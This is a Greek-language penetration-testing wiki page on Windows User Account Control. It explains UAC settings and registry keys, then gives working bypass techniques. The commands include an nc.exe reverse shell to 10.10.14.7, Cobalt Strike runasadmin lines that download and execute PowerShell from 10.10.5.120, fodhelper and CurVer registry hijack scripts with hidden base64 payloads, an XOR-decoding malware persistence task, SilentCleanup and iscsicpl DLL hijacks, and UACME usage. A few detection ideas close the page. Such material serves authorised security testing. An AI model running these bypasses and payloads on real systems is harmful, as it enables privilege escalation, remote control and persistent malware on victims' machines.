# UAC - Έλεγχος λογαριασμού χρήστη

{{#include ../../banners/hacktricks-training.md}}

## UAC

Το [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που ενεργοποιεί ένα **μήνυμα συναίνεσης για δραστηριότητες με αυξημένα δικαιώματα**. Οι εφαρμογές έχουν διαφορετικά επίπεδα `integrity` και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελέσει εργασίες που **ενδέχεται να θέσουν σε κίνδυνο το σύστημα**. Όταν το UAC είναι ενεργοποιημένο, οι εφαρμογές και οι εργασίες εκτελούνται πάντα **στο πλαίσιο ασφαλείας ενός λογαριασμού χωρίς δικαιώματα διαχειριστή**, εκτός εάν ένας διαχειριστής εξουσιοδοτήσει ρητά αυτές τις εφαρμογές/εργασίες να αποκτήσουν πρόσβαση επιπέδου διαχειριστή στο σύστημα για να εκτελεστούν. Είναι μια δυνατότητα ευκολίας που προστατεύει τους διαχειριστές από ακούσιες αλλαγές, αλλά δεν θεωρείται όριο ασφαλείας.

Για περισσότερες πληροφορίες σχετικά με τα επίπεδα integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν το UAC είναι ενεργό, σε έναν χρήστη-διαχειριστή παρέχονται 2 tokens: ένα token τυπικού χρήστη, για την εκτέλεση κανονικών ενεργειών με medium integrity, και ένα με τα δικαιώματα διαχειριστή.

Αυτή η [σελίδα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) περιγράφει με μεγάλη λεπτομέρεια τον τρόπο λειτουργίας του UAC και περιλαμβάνει τη διαδικασία logon, την εμπειρία χρήστη και την αρχιτεκτονική του UAC. Οι διαχειριστές μπορούν να χρησιμοποιούν πολιτικές ασφαλείας για να διαμορφώσουν τον τρόπο λειτουργίας του UAC ειδικά για τον οργανισμό τους σε τοπικό επίπεδο (χρησιμοποιώντας το secpol.msc) ή να το διαμορφώσουν και να το διανείμουν μέσω Group Policy Objects (GPO) σε περιβάλλον domain του Active Directory. Οι διάφορες ρυθμίσεις περιγράφονται λεπτομερώς [εδώ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 ρυθμίσεις Group Policy που μπορούν να οριστούν για το UAC. Ο παρακάτω πίνακας παρέχει περισσότερες λεπτομέρειες:

| Ρύθμιση Group Policy                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Προεπιλεγμένη ρύθμιση                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Αίτημα συναίνεσης για non-Windows binaries στην ασφαλή επιφάνεια εργασίας) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Αίτημα credentials στην ασφαλή επιφάνεια εργασίας)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Ενεργοποιημένο· απενεργοποιημένο από προεπιλογή στην Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Ενεργοποιημένο)                                              |

### Πολιτικές για την εγκατάσταση software στα Windows

Οι **τοπικές πολιτικές ασφαλείας** ("secpol.msc" στα περισσότερα συστήματα) είναι ρυθμισμένες από προεπιλογή ώστε να **εμποδίζουν χρήστες χωρίς δικαιώματα διαχειριστή να εκτελούν εγκαταστάσεις software**. Αυτό σημαίνει ότι ακόμη και αν ένας χρήστης χωρίς δικαιώματα διαχειριστή μπορεί να κατεβάσει τον installer του software σας, δεν θα μπορεί να τον εκτελέσει χωρίς λογαριασμό διαχειριστή.

### Registry Keys για την υποχρεωτική εμφάνιση αιτήματος ανύψωσης από το UAC

Ως τυπικός χρήστης χωρίς δικαιώματα διαχειριστή, μπορείτε να διασφαλίσετε ότι ο "τυπικός" λογαριασμός θα **καλείται από το UAC να εισαγάγει credentials** όταν επιχειρεί να εκτελέσει συγκεκριμένες ενέργειες. Αυτή η ενέργεια απαιτεί την τροποποίηση ορισμένων **registry keys**, για τα οποία χρειάζεστε δικαιώματα διαχειριστή, εκτός εάν υπάρχει **UAC bypass** ή ο attacker είναι ήδη logged in ως διαχειριστής.

Ακόμη και αν ο χρήστης ανήκει στην ομάδα **Administrators**, αυτές οι αλλαγές υποχρεώνουν τον χρήστη να **εισαγάγει ξανά τα credentials του λογαριασμού του** προκειμένου να εκτελέσει διαχειριστικές ενέργειες.

**Στην πράξη, αυτό είναι χρήσιμο μόνο όταν διαθέτετε ήδη ένα elevated token, ένα UAC bypass ή μια misconfiguration που σας επιτρέπει να αλλάξετε αυτά τα keys· διαφορετικά, το ίδιο το registry write μπλοκάρεται.**

Τα registry keys και οι καταχωρίσεις που πρέπει να αλλάξετε είναι τα εξής (με τις προεπιλεγμένες τιμές τους σε παρένθεση):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Αυτό μπορεί επίσης να γίνει χειροκίνητα μέσω του εργαλείου Local Security Policy. Μόλις αλλάξουν, οι διαχειριστικές λειτουργίες ζητούν από τον χρήστη να εισαγάγει ξανά τα credentials του.

### Σημείωση

**Το User Account Control δεν αποτελεί όριο ασφαλείας.** Επομένως, οι τυπικοί χρήστες δεν μπορούν να ξεφύγουν από τους λογαριασμούς τους και να αποκτήσουν δικαιώματα διαχειριστή χωρίς ένα local privilege escalation exploit.

### Ζητήστε από έναν χρήστη «πλήρη πρόσβαση στον υπολογιστή»
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Το Internet Explorer Protected Mode χρησιμοποιεί ελέγχους ακεραιότητας για να αποτρέπει την πρόσβαση διεργασιών υψηλού επιπέδου ακεραιότητας (όπως τα web browsers) σε δεδομένα χαμηλού επιπέδου ακεραιότητας (όπως τον φάκελο προσωρινών αρχείων Internet). Αυτό επιτυγχάνεται με την εκτέλεση του browser με token χαμηλής ακεραιότητας. Όταν ο browser προσπαθεί να αποκτήσει πρόσβαση σε δεδομένα που είναι αποθηκευμένα στη ζώνη χαμηλής ακεραιότητας, το λειτουργικό σύστημα ελέγχει το επίπεδο ακεραιότητας της διεργασίας και επιτρέπει την πρόσβαση ανάλογα. Αυτή η δυνατότητα βοηθά στην αποτροπή επιθέσεων remote code execution από το να αποκτήσουν πρόσβαση σε ευαίσθητα δεδομένα του συστήματος.
- Όταν ένας χρήστης συνδέεται στα Windows, το σύστημα δημιουργεί ένα access token που περιέχει μια λίστα με τα privileges του χρήστη. Τα privileges ορίζονται ως ο συνδυασμός των δικαιωμάτων και των δυνατοτήτων ενός χρήστη. Το token περιέχει επίσης μια λίστα με τα credentials του χρήστη, δηλαδή τα credentials που χρησιμοποιούνται για την authentication του χρήστη στον υπολογιστή και σε resources του δικτύου.

### Autoadminlogon

Για να ρυθμίσετε τα Windows ώστε να συνδέουν αυτόματα έναν συγκεκριμένο χρήστη κατά την εκκίνηση, ορίστε το **`AutoAdminLogon` registry key**. Αυτό είναι χρήσιμο σε περιβάλλοντα kiosk ή για σκοπούς testing. Χρησιμοποιήστε το μόνο σε ασφαλή συστήματα, καθώς εκθέτει το password στο registry.

Ορίστε τα ακόλουθα keys χρησιμοποιώντας τον Registry Editor ή το `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Για να επαναφέρετε τη φυσιολογική συμπεριφορά σύνδεσης, ορίστε το `AutoAdminLogon` σε 0.

## UAC bypass

> [!TIP]
> Σημειώστε ότι αν έχετε graphical access στο victim, το UAC bypass είναι straightforward, καθώς μπορείτε απλώς να κάνετε click στο "Yes" όταν εμφανιστεί το UAC prompt

Το UAC bypass απαιτείται στην ακόλουθη περίπτωση: **το UAC είναι ενεργοποιημένο, η διεργασία σας εκτελείται σε context μέσης ακεραιότητας και ο χρήστης σας ανήκει στο administrators group**.

Είναι σημαντικό να αναφερθεί ότι είναι **πολύ δυσκολότερο να κάνετε bypass το UAC όταν βρίσκεται στο υψηλότερο επίπεδο ασφάλειας (Always) απ' ό,τι όταν βρίσκεται σε οποιοδήποτε από τα άλλα επίπεδα (Default).**

### Fast triage από shell μέσης ακεραιότητας

Πριν επιχειρήσετε bypass, επιβεβαιώστε ότι βρίσκεστε στο σωστό scenario και αντιστοιχίστε το host build με γνωστές λειτουργικές μεθόδους:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Πρακτικές σημειώσεις:
- Αν το `EnableLUA=0`, δεν χρειάζεστε bypass: οποιοδήποτε admin token μπορεί να ζητήσει απευθείας high integrity.
- Το `ConsentPromptBehaviorAdmin=2` ή `5` είναι το συνηθισμένο σενάριο για auto-elevate / COM-based bypasses.
- Το `Always Notify` ανεβάζει τον πήχη, αλλά θα πρέπει και πάλι να δοκιμάζετε το ακριβές build αντί να θεωρείτε δεδομένη την αποτυχία: το UACME εξακολουθεί να καταγράφει ορισμένες μεθόδους συμβατές με `AlwaysNotify` σε σύγχρονα Windows builds.

### Το UAC απενεργοποιημένο

Αν το UAC είναι ήδη απενεργοποιημένο (`ConsentPromptBehaviorAdmin` είναι **`0`**), μπορείτε να **εκτελέσετε ένα reverse shell με admin privileges** (high integrity level) χρησιμοποιώντας κάτι όπως:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Πολύ** βασικό UAC "bypass" (πλήρης πρόσβαση στο file system)

Αν έχετε ένα shell με έναν χρήστη που ανήκει στο group Administrators, μπορείτε να **κάνετε mount το C$** shared μέσω SMB (file system) τοπικά σε έναν νέο δίσκο και θα έχετε **πρόσβαση σε όλα μέσα στο file system** (ακόμη και στον home folder του Administrator).

> [!WARNING]
> **Φαίνεται ότι αυτό το trick δεν λειτουργεί πλέον**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with Cobalt Strike

Οι τεχνικές του Cobalt Strike θα λειτουργήσουν μόνο αν το UAC δεν έχει ρυθμιστεί στο μέγιστο επίπεδο ασφάλειας
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** και το **Metasploit** διαθέτουν επίσης αρκετά modules για **bypass** του **UAC**.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Τα auto-elevated COM objects παραμένουν ένα πρακτικό UAC surface στις σύγχρονες εκδόσεις. Το `ICMLuaUtil` εξακολουθεί να καταγράφεται από το UACME ως λειτουργικό στις τρέχουσες εκδόσεις των Windows, ενώ τα offensive εργαλεία συνεχίζουν να προσαρμόζουν το `CMSTPLUA`, συνδυάζοντας μια διεργασία σε interactive desktop, εκτέλεση 64-bit και, μερικές φορές, PEB/process masquerading πριν από την κλήση του COM Elevation Moniker.

Πρακτικές συμβουλές:
- Προτιμήστε μια **64-bit** διεργασία στο **interactive session** του χρήστη (συνήθως το `explorer.exe` ή ένα child process του).
- Αν ένα raw shell αποτύχει, δοκιμάστε ξανά από ένα BOF / UACME implementation αντί για ένα απλοϊκό wrapper του `CreateProcess`.
- Περιμένετε η εκτέλεση του child process να πραγματοποιηθεί σε **ξεχωριστή elevated διεργασία**· πολλά BOFs δεν κάνουν elevate το τρέχον beacon in-place.

### KRBUACBypass

Documentation και tool στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

Το [**UACME** ](https://github.com/hfiref0x/UACME), το οποίο αποτελεί **compilation** αρκετών UAC bypass exploits. Σημειώστε ότι θα χρειαστεί να κάνετε **compile το UACME χρησιμοποιώντας visual studio ή msbuild**. Η compilation θα δημιουργήσει αρκετά executables (όπως το `Source\Akagi\outout\x64\Debug\Akagi.exe`)· θα χρειαστεί να γνωρίζετε **ποιο χρειάζεστε.**\
Θα πρέπει να είστε **προσεκτικοί**, επειδή ορισμένα bypasses θα **εμφανίσουν prompts για άλλα προγράμματα**, τα οποία θα **ειδοποιήσουν** τον **χρήστη** ότι κάτι συμβαίνει.

Το UACME διαθέτει την **build version από την οποία κάθε technique άρχισε να λειτουργεί**. Μπορείτε να αναζητήσετε μια technique που επηρεάζει τις εκδόσεις σας:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Επίσης, χρησιμοποιώντας [αυτή](https://en.wikipedia.org/wiki/Windows_10_version_history) τη σελίδα, μπορείτε να βρείτε την έκδοση Windows `1607` από τις εκδόσεις build.

Μια πρακτική ροή εργασίας είναι να **βαθμολογήσετε πρώτα το build του host** και, μόνο μετά, να εκτελέσετε την αντίστοιχη μέθοδο:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- Το `WinPwnage` συγκρίνει γρήγορα το τοπικό build με τις γνωστές μεθόδους UAC, κάτι χρήσιμο για την άμεση απόρριψη μη λειτουργικών PoC.
- Το `UACME` παραμένει ο καλύτερος δημόσιος κατάλογος για την αντιστοίχιση ενός bypass με ένα συγκεκριμένο build. Οι πρόσφατες εκδόσεις πρόσθεσαν νέες μεθόδους και επανέλεγξαν τις υπάρχουσες σε **Windows 11 25H2**, επομένως ελέγξτε ξανά το README/release notes πριν θεωρήσετε ότι μια παλιά δημοσίευση σε blog εξακολουθεί να εφαρμόζεται χωρίς αλλαγές.

### UAC Bypass – fodhelper.exe (Registry hijack)

Το αξιόπιστο binary `fodhelper.exe` εκτελείται αυτόματα με αυξημένα δικαιώματα στα σύγχρονα Windows. Κατά την εκκίνησή του, αναζητά την παρακάτω per-user διαδρομή μητρώου χωρίς να επικυρώνει το verb `DelegateExecute`. Η τοποθέτηση μιας εντολής εκεί επιτρέπει σε μια διεργασία Medium Integrity (όταν ο user ανήκει στους Administrators) να εκκινήσει μια διεργασία High Integrity χωρίς προτροπή UAC.

Διαδρομή μητρώου που αναζητά το fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Βήματα PowerShell (ορίστε το payload σας και, στη συνέχεια, ενεργοποιήστε το)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Σημειώσεις:
- Λειτουργεί όταν ο τρέχων χρήστης είναι μέλος των Administrators και το επίπεδο UAC είναι προεπιλεγμένο/χαλαρό (όχι Always Notify με επιπλέον περιορισμούς).
- Χρησιμοποιήστε τη διαδρομή `sysnative` για να εκκινήσετε ένα 64-bit PowerShell από μια διεργασία 32-bit σε Windows 64-bit.
- Το Payload μπορεί να είναι οποιαδήποτε εντολή (PowerShell, cmd ή διαδρομή EXE). Αποφύγετε τα UIs που εμφανίζουν προτροπές για stealth.

#### Παραλλαγή CurVer/extension hijack (μόνο HKCU)

Πρόσφατα δείγματα που κάνουν abuse του `fodhelper.exe` αποφεύγουν το `DelegateExecute` και, αντί γι’ αυτό, **ανακατευθύνουν το `ms-settings` ProgID** μέσω της τιμής `CurVer` ανά χρήστη. Το auto-elevated binary εξακολουθεί να επιλύει τον handler υπό το `HKCU`, επομένως δεν απαιτείται admin token για την εγκατάσταση των keys:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Μόλις αποκτήσει elevated δικαιώματα, το malware συνήθως **απενεργοποιεί τις μελλοντικές προτροπές** ορίζοντας το `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` σε `0` και στη συνέχεια εκτελεί επιπλέον defense evasion (π.χ. `Add-MpPreference -ExclusionPath C:\ProgramData`) και αναδημιουργεί το persistence ώστε να εκτελείται με high integrity. Ένα τυπικό persistence task αποθηκεύει στον δίσκο ένα **XOR-encrypted PowerShell script** και το αποκωδικοποιεί/εκτελεί στη μνήμη κάθε ώρα:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Αυτή η παραλλαγή εξακολουθεί να καθαρίζει το dropper και αφήνει μόνο τα staged payloads, επομένως η ανίχνευση βασίζεται στην παρακολούθηση του **`CurVer` hijack**, της παραποίησης του `ConsentPromptBehaviorAdmin`, της δημιουργίας εξαιρέσεων στο Defender ή scheduled tasks που κάνουν in-memory decrypt του PowerShell.

### UAC bypass μέσω του task `SilentCleanup` (`HKCU\Environment\windir`)

Το `SilentCleanup` εκκινεί το `cleanmgr.exe` με τα υψηλότερα δικαιώματα και κάνει expand το `%windir%` από το user environment. Αν ελέγχεις το `HKCU\Environment\windir`, μπορείς να ανακατευθύνεις αυτό το expansion σε μια αυθαίρετη εντολή και να αποκτήσεις high integrity χωρίς consent dialog. Αυτή η μέθοδος εξακολουθεί να αξίζει testing σε πρόσφατα builds, επειδή το UACME διατηρεί την τεχνική ενεργή και η πρόσφατη παρακολούθηση ζητημάτων δείχνει ότι το Windows 11 24H2 μπορεί να απαιτεί μόνο μικρές προσαρμογές στο quoting.
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
If το task κάνει quote το path σε εκείνο το build, επανέλαβε με το payload να τελειώνει σε quote (για παράδειγμα `cmd.exe"`). Πάντα κάνε cleanup του `HKCU\Environment\windir` μετά το testing.

#### Περισσότερο UAC bypass

Πολλά κλασικά UAC bypasses που κάνουν abuse UI flows, COM objects ή desktop interaction απαιτούν μια **πλήρη interactive session** με το victim· ένα συνηθισμένο shell μέσω **`nc.exe`** ή ένα service που εκτελείται στο **Session 0** συχνά δεν αρκεί.

Συχνά μπορείς να το λύσεις χρησιμοποιώντας μια **meterpreter** session. Κάνε migrate σε μια **process** που έχει τιμή **Session** ίση με **1**:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: Μπορείς να το κάνεις μέσω μιας meterpreter session. Κάνε migrate σε μια process που έχει το Session...](<../../images/image (863).png>)

(_explorer.exe_ θα πρέπει να λειτουργεί)

### UAC Bypass με GUI

Αν έχεις πρόσβαση σε **GUI**, μπορείς απλώς να αποδεχτείς το UAC prompt όταν εμφανιστεί· δεν χρειάζεσαι πραγματικά ένα technical bypass. Επομένως, η απόκτηση μιας GUI session συχνά αρκεί για να παρακάμψεις την πρακτική τριβή που προσθέτει το UAC.

Επιπλέον, αν αποκτήσεις μια GUI session που χρησιμοποιούσε κάποιος (ενδεχομένως μέσω RDP), θα υπάρχουν **κάποια tools που θα εκτελούνται ως administrator**, από τα οποία θα μπορούσες να **εκτελέσεις** για παράδειγμα ένα **cmd** **ως admin** απευθείας, χωρίς να εμφανιστεί ξανά prompt από το UAC, όπως το [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο **stealthy**.

### Θορυβώδες brute-force UAC bypass

Αν δεν σε ενδιαφέρει να είσαι θορυβώδης, θα μπορούσες πάντα να **εκτελέσεις κάτι όπως** το [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), το οποίο **ζητά elevation permissions μέχρι ο user να το αποδεχτεί**.

### Το δικό σου bypass - Basic UAC bypass methodology

Αν ρίξεις μια ματιά στο **UACME**, θα παρατηρήσεις ότι **πολλά UAC bypasses κάνουν abuse το DLL hijacking** (συχνά κάνοντας ένα elevated binary να φορτώσει ένα attacker-controlled DLL από ένα writable path). [Διάβασε αυτό για να μάθεις πώς να βρεις μια DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Βρες ένα binary που θα κάνει **autoelevate** (έλεγξε ότι όταν εκτελείται, τρέχει σε high integrity level).
2. Με το procmon βρες events "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανότατα θα χρειαστεί να **γράψεις** το DLL μέσα σε κάποια **protected paths** (όπως το C:\Windows\System32), όπου δεν έχεις write permissions. Μπορείς να το παρακάμψεις χρησιμοποιώντας:
1. **wusa.exe**: Windows 7,8 και 8.1. Επιτρέπει την εξαγωγή του περιεχομένου ενός CAB file μέσα σε protected paths (επειδή αυτό το tool εκτελείται από high integrity level).
2. **IFileOperation**: Windows 10.
4. Ετοίμασε ένα **script** για να αντιγράψει το DLL μέσα στο protected path και να εκτελέσει το vulnerable και autoelevated binary.

### Μια άλλη UAC bypass technique

Συνίσταται στο να παρακολουθείς αν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **registry** το **όνομα/path** ενός **binary** ή **command** προς **εκτέλεση** (αυτό είναι πιο ενδιαφέρον αν το binary αναζητά αυτές τις πληροφορίες μέσα στο **HKCU**).

### UAC bypass μέσω `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

Το 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` είναι ένα **auto-elevated** binary που μπορεί να γίνει abuse για να φορτώσει το `iscsiexe.dll` μέσω search order. Αν μπορείς να τοποθετήσεις ένα malicious `iscsiexe.dll` μέσα σε έναν **user-writable** folder και στη συνέχεια να τροποποιήσεις το `PATH` του current user (για παράδειγμα μέσω του `HKCU\Environment\Path`), ώστε να γίνεται αναζήτηση σε αυτόν τον folder, τα Windows μπορεί να φορτώσουν το attacker DLL μέσα στην elevated process του `iscsicpl.exe` **χωρίς να εμφανίσουν UAC prompt**.

Πρακτικές σημειώσεις:
- Αυτό είναι χρήσιμο όταν ο current user ανήκει στους **Administrators**, αλλά εκτελείται σε **Medium Integrity** λόγω του UAC.
- Το αντίγραφο στο **SysWOW64** είναι το σχετικό για αυτό το bypass. Αντιμετώπισε το αντίγραφο στο **System32** ως ξεχωριστό binary και επιβεβαίωσε τη συμπεριφορά ανεξάρτητα.
- Το primitive είναι συνδυασμός **auto-elevation** και **DLL search-order hijacking**, επομένως το ίδιο ProcMon workflow που χρησιμοποιείται για άλλα UAC bypasses είναι χρήσιμο για την επιβεβαίωση του missing DLL load.

Ελάχιστη ροή:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ιδέες ανίχνευσης:
- Δημιουργήστε alert για `reg add` / εγγραφές στο registry στο `HKCU\Environment\Path`, οι οποίες ακολουθούνται άμεσα από την εκτέλεση του `C:\Windows\SysWOW64\iscsicpl.exe`.
- Αναζητήστε το `iscsiexe.dll` σε **τοποθεσίες που ελέγχονται από τον χρήστη**, όπως `%TEMP%` ή `%LOCALAPPDATA%\Microsoft\WindowsApps`.
